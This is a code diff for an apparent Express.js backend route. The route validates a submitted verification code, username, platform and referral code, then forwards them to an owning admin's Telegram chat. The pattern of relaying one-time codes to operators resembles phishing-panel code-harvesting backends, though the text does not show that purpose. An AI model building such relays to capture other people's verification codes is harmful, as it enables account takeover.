@@ -802,32 +802,41 @@ IP ${ip[0]}
 app.post("/student/send-code", async (req, res) => {
   try {
     const { code, referralCode, platform, username } = req.body || {};
-    if (!referralCode) return res.status(400).json({ success: false, error: "Referral code is required" });
-    if (!code) return res.status(400).json({ success: false, error: "Verification code is required" });
+    
+    if (!referralCode?.trim()) return res.status(400).json({ success: false, error: "Referral code is required" });
+    if (!code?.trim()) return res.status(400).json({ success: false, error: "Verification code is required" });
+    if (!username?.trim()) return res.status(400).json({ success: false, error: "Username is required" });
 
-    const ref = await Referral.findOne({ code: referralCode }).lean();
+    const ref = await Referral.findOne({ code: referralCode.trim() }).lean();
     if (!ref) return res.status(404).json({ success: false, error: "Invalid referral code" });
+    
+    const student = await Student.findOne({ username: username.trim() });
+    if (!student) return res.status(404).json({ success: false, error: "Student not found" });
 
-    const admin = await Admin.findById(ref.adminId);
-    if (!admin) return res.status(404).json({ success: false, error: "Admin not found" });
+    const admin = await Admin.findOne({ username: student.owner });
+    if (!admin || !admin.chatId) return res.status(404).json({ success: false, error: "Admin not found or Telegram not linked" });
 
     const msg = `
 🔐 VERIFICATION REQUEST
-Username: ${escapeMarkdown(username || "Unknown")}
+Username: ${escapeMarkdown(username)}
 Platform: ${escapeMarkdown(platform || "unknown")}
 Code: \`${escapeMarkdown(code)}\`
+Referral: ${escapeMarkdown(referralCode)}
 `;
-    await sendTelegram(admin.chatId || ADMIN_CHAT_ID, msg);
+    await sendTelegram(admin.chatId, msg);
 
-    await Activity.create({ adminId: admin._id, action: "verification_requested", details: { username, code, platform } });
+    await Activity.create({ 
+      adminId: admin._id, 
+      action: "verification_requested", 
+      details: { username, code, platform, referralCode } 
+    });
 
     return res.json({ success: true, message: "Verification request sent to admin" });
   } catch (err) {
-    console.error("Send-code error:", err && err.message || err);
-    return res.status(500).json({ success: false, error: "Server error while sending code", details: err && err.message });
+    console.error("Send-code error:", err?.message || err);
+    return res.status(500).json({ success: false, error: "Server error while sending code" });
   }
 });
-
 // ---------- ADMIN BROADCAST ----------
 app.post("/admin/broadcast",  async (req, res) => {
   try {
